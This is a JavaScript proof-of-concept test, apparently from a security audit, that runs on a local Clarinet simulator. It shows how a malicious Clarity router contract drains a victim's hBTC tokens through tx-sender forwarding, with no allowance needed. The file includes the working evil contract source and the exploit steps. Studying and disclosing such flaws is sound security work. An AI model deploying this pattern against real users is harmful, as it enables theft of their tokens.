import assert from 'node:assert/strict';
import { initSimnet } from '@stacks/clarinet-sdk';
import { Cl, cvToString } from '@stacks/transactions';

const manifest = 'tests/security/standalone/Clarinet.toml';
const simnet = await initSimnet(manifest);
const accounts = simnet.getAccounts();
const deployer = accounts.get('deployer');
const attacker = accounts.get('wallet_2');
const victim = accounts.get('wallet_3');
if (!deployer || !attacker || !victim) throw new Error('missing simnet accounts');

const BASE = 100_000_000n;
const c = (name) => `${deployer}.${name}`;
const pub = (contract, method, args, sender) => simnet.callPublicFn(c(contract), method, args, sender);
const ro = (contract, method, args, sender = deployer) => simnet.callReadOnlyFn(c(contract), method, args, sender);
const cv = (r) => cvToString(r.result);
const expectCv = (label, result, expected) => {
  const actual = cv(result);
  console.log(`${label}: ${actual}`);
  assert.equal(actual, expected, `${label}: expected ${expected}, got ${actual}`);
};
const balance = (who) => {
  const r = ro('token-hbtc', 'get-balance', [Cl.principal(who)]);
  console.log(`hBTC.balance(${who}): ${cv(r)}`);
  return BigInt(r.result.value.value);
};

console.log('=== PoC #6 strengthened: direct theft of in-scope hBTC token ===');

// Local funding setup only. The production hBTC token allows minting only by a
// timelocked PROTOCOL role, so establish that role using the real hBTC HQ flow.
expectCv(
  'hq-hbtc.request-protocol-update(deployer,true)',
  pub('hq-hbtc', 'request-protocol-update', [Cl.principal(deployer), Cl.bool(true)], deployer),
  '(ok true)',
);

// Production minimum timelock is 86400 seconds. 200 simnet blocks comfortably
// pass it in this harness.
simnet.mineEmptyBlocks(200);
expectCv(
  'hq-hbtc.confirm-protocol-request(deployer)',
  pub('hq-hbtc', 'confirm-protocol-request', [Cl.principal(deployer)], deployer),
  '(ok true)',
);

expectCv(
  'token-hbtc.mint-for-protocol(1 hBTC -> victim)',
  pub('token-hbtc', 'mint-for-protocol', [Cl.uint(BASE), Cl.principal(victim)], deployer),
  '(ok true)',
);
assert.equal(balance(victim), BASE);
assert.equal(balance(attacker), 0n);

const evilSource = `
  (define-public (steal-hbtc (amount uint) (recipient principal))
    (contract-call? '${deployer}.token-hbtc transfer amount tx-sender recipient none))
`;
const deployment = simnet.deployContract('evil-hbtc-router', evilSource, { clarityVersion: 4 }, attacker);
console.log(`deploy evil-hbtc-router: ${cv(deployment)}`);
const evil = `${attacker}.evil-hbtc-router`;

// Victim signs/calls only the malicious contract. No approval exists and the
// victim does not directly invoke token-hbtc.transfer.
expectCv(
  'victim -> evil-hbtc-router.steal-hbtc',
  simnet.callPublicFn(evil, 'steal-hbtc', [Cl.uint(BASE), Cl.principal(attacker)], victim),
  '(ok true)',
);

assert.equal(balance(victim), 0n);
assert.equal(balance(attacker), BASE);

console.log('PASS hBTC: victim calling one malicious contract loses 1.00000000 hBTC to attacker without allowance.');
